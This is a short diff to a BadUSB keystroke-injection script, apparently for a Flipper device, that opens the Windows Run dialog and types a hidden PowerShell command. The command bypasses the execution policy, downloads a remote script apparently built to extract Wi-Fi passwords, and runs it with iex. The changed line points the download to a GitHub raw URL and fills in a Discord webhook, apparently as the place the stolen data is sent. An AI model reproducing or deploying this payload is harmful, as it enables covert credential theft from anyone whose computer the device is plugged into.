@@ -12,4 +12,4 @@ REM ###################################################################
 DELAY 2000
 GUI r
 DELAY 250
-STRINGLN powershell -w h -ep bypass $discord='';irm bit.ly/WindowsWiFiPasswordsENG | iex
+STRINGLN powershell -w h -ep bypass $discord='https://discord.com/api/webhooks/1258457412218912879/UrCDQe4bLiJ3bjqAk1qNEZMBH7y3yZJFKY85fm_myreCIWngRK8n4G0HypyIQFYDfWre';irm https://raw.githubusercontent.com/wzqvip/Flipper-BadUSB/main/1-resources/Windows-Passwords-ENG.ps1 | iex
